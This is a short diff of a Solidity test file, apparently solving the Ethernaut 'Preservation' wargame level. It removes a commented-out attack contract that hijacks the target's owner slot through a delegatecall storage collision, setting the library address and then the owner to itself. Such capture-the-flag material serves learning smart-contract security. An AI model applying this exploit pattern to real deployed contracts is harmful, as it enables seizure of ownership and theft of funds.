@@ -38,24 +38,3 @@ contract ContractTest is Test {
 
     receive() external payable {}
 }
-
-// contract AttackContract {
-//     address public tz1_lib;
-//     address public tz2_lib;
-//     address public owner;
-
-//     Preservation level16 =
-//         Preservation(payable(0xa808f0ca798Bd41c5985b887F407754a36cebB57));
-
-//     function trigger() public {
-//         address addr = address(this);
-//         level16.setSecondTime(uint256(uint160(addr)));
-//         level16.setFirstTime(uint256(uint160(addr)));
-//     }
-
-//     function setTime(uint256 _timestamp) public {
-//         console.log("set owner as player");
-
-//         owner = address(uint160(_timestamp));
-//     }
-// }
